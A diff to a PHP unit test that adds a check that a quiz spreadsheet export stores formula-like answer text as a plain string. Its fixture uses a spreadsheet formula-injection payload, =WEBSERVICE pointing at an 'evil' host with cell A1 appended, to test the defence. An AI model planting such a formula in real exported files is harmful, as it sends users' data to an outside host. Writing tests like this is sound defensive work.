@@ -4,6 +4,7 @@ declare(strict_types=1);
 
 namespace Tvdt\Tests\Service;
 
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
 use PhpOffice\PhpSpreadsheet\Reader;
 use PhpOffice\PhpSpreadsheet\Spreadsheet;
 use PhpOffice\PhpSpreadsheet\Writer;
@@ -119,6 +120,26 @@ final class QuizSpreadsheetServiceTest extends TestCase
         $second = $imported->questions->last();
         $this->assertSame('What did de Mol sabotage?', $second->question);
         $this->assertCount(3, $second->answers);
+    }
+
+    public function testQuizToXlsxStoresFormulaLikeAnswerTextAsPlainString(): void
+    {
+        $quiz = new Quiz();
+        $question = new Question();
+        $question->question = 'Who missed the assignment?';
+        $question->ordering = 1;
+        $question->addAnswer(new Answer('=WEBSERVICE("http://evil/?"&A1)', isRightAnswer: true));
+        $question->addAnswer(new Answer('Bob', isRightAnswer: false));
+
+        $quiz->addQuestion($question);
+
+        $path = $this->captureXlsx($this->subject->quizToXlsx($quiz));
+
+        $sheet = new Reader\Xlsx()->setReadDataOnly(true)->load($path)->getActiveSheet();
+        $cell = $sheet->getCell('B2');
+
+        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
+        $this->assertSame('=WEBSERVICE("http://evil/?"&A1)', $cell->getValue());
     }
 
     public function testXlsxToQuizThrowsOnInvalidMimeType(): void
